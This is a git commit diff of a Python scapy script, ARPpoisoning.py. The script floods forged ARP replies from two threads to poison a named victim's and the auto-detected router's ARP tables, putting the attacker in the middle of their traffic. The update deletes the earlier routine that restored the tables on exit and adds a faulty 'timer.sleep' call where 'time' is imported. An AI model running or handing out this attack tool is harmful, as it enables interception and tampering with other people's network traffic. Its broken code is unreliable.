172d9283d7cd41975b4746868637ca9b63cf0e14
Brunotti12 <128841706+Brunotti12@users.noreply.github.com>
2024-11-04 16:01:37 +0100

    Update ARPpoisoning.py

--- ARPpoisoning.py
+++ ARPpoisoning.py
@@ -1,31 +1,48 @@
-from scapy.all import ARP, send
+from scapy.all import ARP, send, Ether, srp, conf
+import socket
 import threading
 import time
 
-# Functie om ARP-poisoning uit te voeren
 def arp_poison(target_ip, target_mac, spoof_ip):
     packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
     while True:
         send(packet, verbose=0)
-        time.sleep(2)  # Herhaal om de ARP-tafel vervalst te houden
+        time.sleep(2)  # Repeat to keep ARP table poisoned
 
-# Functie om ARP-tabellen te herstellen na de aanval
-def restore_arp(target_ip, target_mac, spoof_ip, spoof_mac):
-    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=spoof_mac)
-    send(packet, count=5, verbose=0)
+def get_local_ip_and_subnet():
+    hostname = socket.gethostname()
+    local_ip = socket.gethostbyname(hostname)
+    return local_ip
 
-# Instellingen voor ARP-poisoning
-victim_ip = "192.168.1.100"  # IP-adres van het slachtoffer
-victim_mac = "00:0c:29:68:22:51"  # MAC-adres van het slachtoffer
-router_ip = "192.168.1.1"  # IP-adres van de router
-router_mac = "00:1a:2b:3c:4d:5e"  # MAC-adres van de router
+def get_ip_and_mac():
+    local_ip = get_local_ip_and_subnet()
+    subnet = '.'.join(local_ip.split('.')[:-1]) + '.1/24'
+
+    arp_request = ARP(pdst=subnet)
+    ether = Ether(dst='ff:ff:ff:ff:ff:ff')
+    packet = ether / arp_request
+
+    result = srp(packet, timeout=3, verbose=False)[0]
+
+    for sent, received in result:
+        if received.psrc != local_ip:  # Skip responses from the local machine
+            return received.psrc, received.hwsrc
+    
+    print("Failed, not connected")
+    return None, None
+
+# Settings for ARP poisoning
+victim_ip = "192.168.1.100"  # IP address of the victim
+victim_mac = "00:0c:29:68:22:51"  # MAC address of the victim (make sure to set this correctly)
+router_ip, router_mac = get_ip_and_mac()
 
 try:
     print("Starting ARP poisoning...")
+    # Start poisoning threads
     threading.Thread(target=arp_poison, args=(victim_ip, victim_mac, router_ip)).start()
     threading.Thread(target=arp_poison, args=(router_ip, router_mac, victim_ip)).start()
+    while True:
+        timer.sleep(10)
 except KeyboardInterrupt:
-    print("\nStopping ARP poisoning and restoring ARP tables...")
-    restore_arp(victim_ip, victim_mac, router_ip, router_mac)
-    restore_arp(router_ip, router_mac, victim_ip, victim_mac)
-    print("ARP tables restored.")
+    print("stopped")
+
